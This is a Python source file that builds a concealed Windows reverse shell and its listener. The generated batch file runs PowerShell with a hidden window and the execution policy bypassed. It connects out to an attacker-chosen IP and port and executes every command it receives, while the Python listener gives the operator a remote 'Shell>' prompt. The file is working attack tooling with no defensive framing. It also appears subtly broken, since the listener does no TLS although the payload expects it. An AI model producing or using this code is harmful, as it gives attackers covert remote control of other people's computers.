import socket

def generate_payload_ps(ip, port, output_file):
    batch_script_ps = f"""@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port});$s=$c.GetStream();$ssl=New-Object System.Net.Security.SslStream($s,$false,({{ $true }}));$ssl.AuthenticateAsClient('{ip}');$w=New-Object System.IO.StreamWriter($ssl);$w.AutoFlush=$true;$r=New-Object System.IO.StreamReader($ssl);$w.WriteLine('Connected!');while($true){{ $cmd=$r.ReadLine();if($cmd -eq $null){{break}};$out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $w.WriteLine($_) }};$w.WriteLine($out) }};$c.Close()"
"""
    return batch_script_ps

import socket

def listener(ip, port):
    port = int(port)  # Convert port to integer
    
    if ip == "0.0.0.0":
        print("[*] Listening on ALL interfaces...")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        server.bind((ip, port))
    except OSError as e:
        print(f"[-] Failed to bind: {e}")
        print("[*] Try using 0.0.0.0 or check if the IP is correct.")
        return

    server.listen(1)
    print(f"[*] Listening on {ip}:{port}...")
    
    client, addr = server.accept()
    print(f"[+] Connection received from {addr}")

    while True:
        try:
            command = input("Shell> ")
            if command.lower() in ["exit", "quit"]:
                client.send(b"exit")
                client.close()
                break
            client.send(command.encode())
            response = client.recv(4096).decode()
            print(response)
        except Exception as e:
            print(f"[-] Error: {e}")
            break

    server.close()
